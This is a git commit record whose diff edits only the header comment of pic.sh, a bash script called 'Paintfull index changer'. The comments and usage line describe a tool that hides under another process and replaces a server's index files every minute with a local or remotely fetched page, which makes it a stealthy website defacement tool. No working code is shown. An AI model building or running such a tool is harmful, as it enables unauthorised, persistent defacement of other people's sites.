151312a6dcc98f167e9a913e5e5cfa537cb4c570
flashc0re <flashc0re@root.je>
2013-12-23 00:30:55 +0000

    Paintfull index changer

--- pic.sh
+++ pic.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 # Paintfull index changer 0.1 by flash0re
-# Hides under any proccess finds index.* changes it to your every one minute with some tricks like chmod r+r+r or chown
+# Hides under any proccess finds index.* changes it every minute(s) with some tricks like chmod r+r+r,chown,etc...
 # Usage: pic.sh -d "DIR"(Leave blank for all server) -l "local file" -r "remote patch(http://host/my_index.php" -h "name"
